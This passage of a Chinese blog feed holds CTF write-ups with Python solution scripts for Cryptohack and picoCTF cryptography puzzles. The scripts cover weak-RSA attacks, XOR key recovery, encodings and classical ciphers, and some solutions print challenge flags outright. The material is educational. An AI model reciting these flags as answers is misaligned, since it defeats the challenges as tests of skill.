class="number">580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464</span></span><br><span class="line"></span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="PUBLIC-EXPONENT"><a href="#PUBLIC-EXPONENT" class="headerlink" title="PUBLIC EXPONENT"></a>PUBLIC EXPONENT</h1><h2 id="1-Salty"><a href="#1-Salty" class="headerlink" title="1.Salty"></a>1.Salty</h2><blockquote><p>Smallest exponent should be fastest, right?</p></blockquote><p>e=1。且n&gt;c。直接解密即可。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(long_to_bytes(c))</span><br></pre></td></tr></table></figure><h2 id="2-Modulus-Inutilis"><a href="#2-Modulus-Inutilis" class="headerlink" title="2.Modulus Inutilis"></a>2.Modulus Inutilis</h2><blockquote><p>My primes should be more than large enough now!</p></blockquote><p>e=3且n&gt;&gt;c,直接开方即可或者低加密质数攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; #</span><br><span class="line">e &#x3D; 3</span><br><span class="line">c &#x3D; #</span><br><span class="line"># phi&#x3D;</span><br><span class="line"># d&#x3D;invert(e,phi)</span><br><span class="line"># m&#x3D;pow(c,d,n)</span><br><span class="line">m&#x3D;iroot(c,e)[0]</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="3-Everything-is-Big"><a href="#3-Everything-is-Big" class="headerlink" title="3.Everything is Big"></a>3.Everything is Big</h2><blockquote><p>I asked my friends to encrypt our secret flag before sending it to me, but instead of using my key, they’ve all used their own! Can you help?</p></blockquote><p>重复套娃即可</p><h2 id="4-Everything-is-Still-Big"><a href="#4-Everything-is-Still-Big" class="headerlink" title="4.Everything is Still Big"></a>4.Everything is Still Big</h2><p>根据源码可知<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/fa302cb878c813c00cd5148afd2b7030.svg" alt="img">。</p><p>使用Boneh and Durfee attack求得d然后就是常规解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x3D;11780471238670051178036100291599528752121010273742795983048162524067159920858226567772845036827236538829687625029129242589458595768537819428280893758899509</span><br></pre></td></tr></table></figure><h2 id="5-Endless-Emails"><a href="#5-Endless-Emails" class="headerlink" title="5.Endless Emails"></a>5.Endless Emails</h2><p>低指数广播攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&#x27;https://cryptohack.org/static/challenges/output_0ef6d6343784e59e2f44f61d2d29896f.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lines = resp.text.splitlines()</span><br><span class="line"></span><br><span class="line">params = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines), <span class="number">5</span>):</span><br><span class="line">    n = <span class="built_in">int</span>(lines[i].split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line">    e = <span class="built_in">int</span>(lines[i+<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line">    c = <span class="built_in">int</span>(lines[i+<span class="number">2</span>].split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line">    params.append([n, c])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">ns, cs</span>):</span></span><br><span class="line">    M = reduce(operator.mul, ns)</span><br><span class="line">    Mi = [M//n <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line">    ti = [<span class="built_in">pow</span>(Mi, -<span class="number">1</span>, n) <span class="keyword">for</span> Mi, n <span class="keyword">in</span> <span class="built_in">zip</span>(Mi, ns)]</span><br><span class="line">    x = <span class="built_in">sum</span>([c*t*m <span class="keyword">for</span> c, t, m <span class="keyword">in</span> <span class="built_in">zip</span>(cs, ti, Mi)]) % M</span><br><span class="line">    r, exact = gmpy2.iroot(x, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> exact:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cb <span class="keyword">in</span> combinations(params, <span class="number">3</span>):</span><br><span class="line">    ns = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    cs = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    r = solve(ns, cs)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(number.long_to_bytes(r))</span><br></pre></td></tr></table></figure><h1 id="PRIMES-PART-2"><a href="#PRIMES-PART-2" class="headerlink" title="PRIMES PART 2"></a>PRIMES PART 2</h1><h2 id="1-Infinite-Descent"><a href="#1-Infinite-Descent" class="headerlink" title="1.Infinite Descent"></a>1.Infinite Descent</h2><p>常规题，factor在线网站能直接分解n。</p><h2 id="2-Marin’s-Secrets"><a href="#2-Marin’s-Secrets" class="headerlink" title="2.Marin’s Secrets"></a>2.Marin’s Secrets</h2><p>常规题，factor在线网站能直接分解n。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;STARTER&quot;&gt;&lt;a href=&quot;#STARTER&quot; class=&quot;headerlink&quot; title=&quot;STARTER&quot;&gt;&lt;/a&gt;STARTER&lt;/h1&gt;&lt;h2 id=&quot;1-RSA-Starter-1&quot;&gt;&lt;a href=&quot;#1-RSA-Starter-1&quot; c</summary>
      
    
    
    
    
    <category term="writeups" scheme="http://example.com/tags/writeups/"/>
    
  </entry>
  
  <entry>
    <title>刷题篇(二)Cryptohack-GENERAL</title>
    <link href="http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%BA%8C-Cryptohack-GENERAL/"/>
    <id>http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%BA%8C-Cryptohack-GENERAL/</id>
    <published>2021-02-16T17:53:31.000Z</published>
    <updated>2021-02-16T18:47:07.169Z</updated>
    
    <content type="html"><![CDATA[<p>-平台规定不能明文发布flag，故只留思路，脚本，以便以后复习。</p><h1 id="ENCODING"><a href="#ENCODING" class="headerlink" title="ENCODING"></a>ENCODING</h1><h2 id="1-ASCII"><a href="#1-ASCII" class="headerlink" title="1.ASCII"></a>1.ASCII</h2><p>题目描述：</p><blockquote><p>ASCII is a 7-bit encoding standard which allows the representation of text using the integers 0-127.</p><p>Using the below integer array, convert the numbers to their corresponding ASCII characters to obtain a flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]</span><br></pre></td></tr></table></figure><p>脚本：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="number">99</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">123</span>, <span class="number">65</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">73</span>, <span class="number">73</span>, <span class="number">95</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">52</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">51</span>, <span class="number">125</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(s[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="2-Hex"><a href="#2-Hex" class="headerlink" title="2.Hex"></a>2.Hex</h2><blockquote><p>When we encrypt something the resulting ciphertext commonly has bytes which are not printable ASCII characters. If we want to share our encrypted data, it’s common to encode it into something more user-friendly and portable across different systems.</p><p>Included below is a the flag encoded as a hex string. Decode this back into bytes to get the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d</span><br></pre></td></tr></table></figure><p>脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">print(long_to_bytes(<span class="number">0x63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d</span>))</span><br></pre></td></tr></table></figure><h2 id="3-Base64"><a href="#3-Base64" class="headerlink" title="3.Base64"></a>3.Base64</h2><blockquote><p>Another common encoding scheme is Base64, which allows us to represent binary data as an ASCII string using 64 characters. One character of a Base64 string encodes 6 bits, and so 4 characters of Base64 encodes three 8-bit bytes.</p><p>Base64 is most commonly used online, where binary data such as images can be easy included into html or css files.</p><p>Take the below hex string, decode it into bytes and then encode it into Base64.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf</span><br></pre></td></tr></table></figure><p>脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=long_to_bytes(<span class="number">0x72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf</span>)</span><br><span class="line">print(base64.b64encode(s))</span><br></pre></td></tr></table></figure><h2 id="4-Bytes-and-Big-Integers"><a href="#4-Bytes-and-Big-Integers" class="headerlink" title="4.Bytes and Big Integers"></a>4.Bytes and Big Integers</h2><blockquote><p>Convert the following integer back into a message:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11515195063862318899931685488813747395775516287289682636499965282714637259206269</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;long_to_bytes(11515195063862318899931685488813747395775516287289682636499965282714637259206269)</span><br></pre></td></tr></table></figure><h2 id="5-Encoding-Challenge"><a href="#5-Encoding-Challenge" class="headerlink" title="5.Encoding Challenge"></a>5.Encoding Challenge</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">r = remote(<span class="string">&#x27;socket.cryptohack.org&#x27;</span>, <span class="number">13377</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_recv</span>():</span></span><br><span class="line">    line = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> json.loads(line.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_send</span>(<span class="params">hsh</span>):</span></span><br><span class="line">    request = json.dumps(hsh).encode()</span><br><span class="line">    r.sendline(request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_words = []  <span class="comment"># 建立接收数据的列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    received = json_recv()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;Received type: &quot;)</span></span><br><span class="line">    <span class="comment"># print(received[&quot;type&quot;])</span></span><br><span class="line">    <span class="comment"># print(&quot;Received encoded value: &quot;)</span></span><br><span class="line">    <span class="comment"># print(received[&quot;encoded&quot;])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> received[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;base64&quot;</span>:  <span class="comment"># 根据编码类型解码加入到列表中</span></span><br><span class="line">        challenge_words.append(base64.b64decode(received[<span class="string">&quot;encoded&quot;</span>].encode()).decode())  <span class="comment"># wow so encode</span></span><br><span class="line">    <span class="keyword">elif</span> received[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;hex&quot;</span>:</span><br><span class="line">        challenge_words.append(unhexlify(received[<span class="string">&quot;encoded&quot;</span>]).decode())</span><br><span class="line">    <span class="keyword">elif</span> received[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;rot13&quot;</span>:</span><br><span class="line">        challenge_words.append(codecs.decode(received[<span class="string">&quot;encoded&quot;</span>], <span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> received[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;bigint&quot;</span>:</span><br><span class="line">        challenge_words.append(long_to_bytes(<span class="built_in">int</span>(received[<span class="string">&quot;encoded&quot;</span>], <span class="number">16</span>)).decode())</span><br><span class="line">    <span class="keyword">elif</span> received[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;utf-8&quot;</span>:</span><br><span class="line">        challenge_words.append(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> received[<span class="string">&quot;encoded&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;%d : %s&quot;</span> % (i, challenge_words[i]))  <span class="comment"># 打印出本次要发送到服务端的值</span></span><br><span class="line"></span><br><span class="line">    to_send = &#123;</span><br><span class="line">        <span class="string">&quot;decoded&quot;</span>: challenge_words[i]</span><br><span class="line">    &#125;</span><br><span class="line">    json_send(to_send)</span><br><span class="line"></span><br><span class="line">received = json_recv()  <span class="comment"># 接收flag数据</span></span><br><span class="line"></span><br><span class="line">print(received[<span class="string">&quot;flag&quot;</span>])</span><br></pre></td></tr></table></figure><h1 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h1><h2 id="1-XOR-Starter"><a href="#1-XOR-Starter" class="headerlink" title="1.XOR Starter"></a>1.XOR Starter</h2><blockquote><p>Given the string <code>&quot;label&quot;</code>, XOR each character with the integer <code>13</code>. Convert these integers back to a string and submit the flag as <code>crypto&#123;new_string&#125;</code>.</p></blockquote><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">o&#x3D;&#39;label&#39;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(o)):</span><br><span class="line">    flag+&#x3D;chr(ord(o[i])^13)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="2-XOR-Properties"><a href="#2-XOR-Properties" class="headerlink" title="2.XOR Properties"></a>2.XOR Properties</h2><blockquote><p>KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313<br>KEY2 ^ KEY1 = 37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e<br>KEY2 ^ KEY3 = c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1<br>FLAG ^ KEY1 ^ KEY3 ^ KEY2 = 04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf</p></blockquote><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KEY1 = <span class="number">0xa6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313</span></span><br><span class="line">KEY2 = <span class="number">233131678106482661238672080114331736309154844705032145066618125</span></span><br><span class="line"></span><br><span class="line">KEY3 = <span class="number">0xc1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1</span>^KEY2</span><br><span class="line">FLAG= <span class="number">0x04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf</span>^KEY2^KEY3^KEY1</span><br><span class="line">print(long_to_bytes(FLAG))</span><br></pre></td></tr></table></figure><h2 id="3-Favourite-byte"><a href="#3-Favourite-byte" class="headerlink" title="3.Favourite byte"></a>3.Favourite byte</h2><blockquote><p>I’ve hidden my data using XOR with a single byte. Don’t forget to decode from hex first.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">print(long_to_bytes(<span class="number">0x73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d</span>))</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;sbi`d\x7fk h! O!%O&#125;iOv$f eb!&#x27;#Ori&#x27;um&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])^o)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;crypto&#x27;</span> <span class="keyword">in</span> flag :</span><br><span class="line"></span><br><span class="line">        print(o)</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h2 id="4-You-either-know-XOR-you-don’t"><a href="#4-You-either-know-XOR-you-don’t" class="headerlink" title="4.You either know, XOR you don’t"></a>4.You either know, XOR you don’t</h2><blockquote><p>I’ve encrypted the flag with my secret key, you’ll never be able to guess it.</p><p>Remember the flag format and how it might help you in this challenge!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&#x27;</span></span><br><span class="line">decoded_data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line"><span class="comment"># print(decoded_data)</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;crypto&#123;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join((<span class="built_in">chr</span>(decoded_data[i] ^ <span class="built_in">ord</span>(<span class="built_in">str</span>[i]))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>))</span><br><span class="line">key = key + <span class="string">&#x27;y&#x27;</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">flag = xor(decoded_data, key.encode())  <span class="comment"># xor函数自动将key匹配为与密文长度一致进行异或解密</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="5-Lemur-XOR"><a href="#5-Lemur-XOR" class="headerlink" title="5.Lemur XOR"></a>5.Lemur XOR</h2><p>用misc的工具，两张图异或就行。</p><h1 id="MATHEMATICS"><a href="#MATHEMATICS" class="headerlink" title="MATHEMATICS"></a>MATHEMATICS</h1><h2 id="1-Greatest-Common-Divisor"><a href="#1-Greatest-Common-Divisor" class="headerlink" title="1.Greatest Common Divisor"></a>1.Greatest Common Divisor</h2><blockquote><p>There are many tools to calculate the GCD of two integers, but for this task we recommend looking up <a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">Euclid’s Algorithm</a>.</p><p>Try coding it up; it’s only a couple of lines. Use <code>a = 12, b = 8</code> to test it.</p><p>Now calculate <code>gcd(a,b)</code> for <code>a = 66528, b = 52920</code> and enter it below.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; 66528</span><br><span class="line">b &#x3D; 52920</span><br><span class="line">print(gcd(a,b))</span><br></pre></td></tr></table></figure><h2 id="2-Extended-GCD"><a href="#2-Extended-GCD" class="headerlink" title="2.Extended GCD"></a>2.Extended GCD</h2><p>ing</p><h2 id="3-Modular-Arithmetic-1"><a href="#3-Modular-Arithmetic-1" class="headerlink" title="3.Modular Arithmetic 1"></a>3.Modular Arithmetic 1</h2><blockquote><p>Calculate the following integers:</p><p>11 ≡ a mod 6<br>8146798528947 ≡ b mod 17</p><p>The solution is the smaller of the two integers.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;11%6</span><br><span class="line">b&#x3D;8146798528947%17</span><br></pre></td></tr></table></figure><h2 id="4-Modular-Arithmetic-2"><a href="#4-Modular-Arithmetic-2" class="headerlink" title="4.Modular Arithmetic 2"></a>4.Modular Arithmetic 2</h2><blockquote><p>Now take the prime <code>p = 65537</code>. Calculate <code>273246787654^65536 mod 65537</code>.</p><p>Did you need a calculator?</p></blockquote><p>费马小定理可知，</p><h2 id="5-Modular-Inverting"><a href="#5-Modular-Inverting" class="headerlink" title="5.Modular Inverting"></a>5.Modular Inverting</h2><blockquote><p><strong>Example</strong>: <code>7 * 8 = 56 ≡ 1 mod 11</code></p><p>What is the inverse element: <code>3 * d ≡ 1 mod 13</code>?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=invert(<span class="number">3</span>,<span class="number">13</span>)<span class="comment">#gmpy2</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-平台规定不能明文发布flag，故只留思路，脚本，以便以后复习。&lt;/p&gt;
&lt;h1 id=&quot;ENCODING&quot;&gt;&lt;a href=&quot;#ENCODING&quot; class=&quot;headerlink&quot; title=&quot;ENCODING&quot;&gt;&lt;/a&gt;ENCODING&lt;/h1&gt;&lt;h2 id=&quot;1</summary>
      
    
    
    
    
    <category term="writeups" scheme="http://example.com/tags/writeups/"/>
    
  </entry>
  
  <entry>
    <title>刷题篇(一)picoCTF-Crypto</title>
    <link href="http://example.com/2021/02/16/%E5%88%B7%E9%A2%98%E7%AF%87(%E4%B8%80%EF%BC%89picoCTF-Crypto/"/>
    <id>http://example.com/2021/02/16/%E5%88%B7%E9%A2%98%E7%AF%87(%E4%B8%80%EF%BC%89picoCTF-Crypto/</id>
    <published>2021-02-16T05:15:07.000Z</published>
    <updated>2021-02-24T00:34:12.838Z</updated>
    
    <content type="html"><![CDATA[<p>-简单，密码全部做完</p><p>-刷题，防止有些数字过长防止打开网页过久，故用#省略。</p><p>注意，别开谷歌翻译，会出现乱码。</p><h2 id="1-The-Numbers-50"><a href="#1-The-Numbers-50" class="headerlink" title="1.The Numbers (50)"></a>1.The Numbers (50)</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216132640387.png" alt="image-20210216132640387"></p><p>出现花括号，且数字不大于26，且提示前7个字母为大写。猜测数字为A-Z下标</p><p>写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a=string.ascii_uppercase <span class="comment">#26个字母</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="number">16</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">6</span>,<span class="number">20</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">19</span>,<span class="number">15</span>,<span class="number">14</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    print(a[<span class="built_in">list</span>[i]-<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#PICOCTF&#123;THENUMBERSMASON&#125;</span></span><br></pre></td></tr></table></figure><h2 id="2-caesar-100"><a href="#2-caesar-100" class="headerlink" title="2.caesar (100)"></a>2.caesar (100)</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216133727395.png" alt="image-20210216133727395"></p><p>古典密码-凯撒加密。</p><p>直接在线解密偏移为2，可得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#picoCTF&#123;crossingtherubiconzaqjsscr&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-Easy1-100"><a href="#3-Easy1-100" class="headerlink" title="3.Easy1 (100)"></a>3.Easy1 (100)</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216134710346.png" alt="image-20210216134710346"></p><p>维吉尼亚加密，密文，密钥给出，在线解密一下即可</p><p><img 